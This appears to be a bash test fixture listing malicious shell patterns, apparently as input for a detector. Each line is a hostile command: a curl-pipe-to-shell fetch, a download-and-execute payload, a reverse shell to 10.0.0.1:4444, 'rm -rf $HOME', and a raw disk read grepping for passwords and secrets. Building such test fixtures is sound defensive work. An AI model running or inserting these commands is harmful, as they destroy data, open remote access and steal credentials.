#!/bin/bash

# Test curl | sh
curl https://example.com/script.sh | sh

# Test wget
wget https://example.com/payload && chmod +x payload && ./payload

# Test reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Test dead man's switch
rm -rf $HOME

# Test raw disk read (container escape — strapi-plugin-cron pattern)
mknod /tmp/hostdisk b 8 1 2>/dev/null
dd if=/dev/sda1 bs=4096 count=5000 2>/dev/null | strings | grep -iE "PASSWORD=|SECRET=" | head -100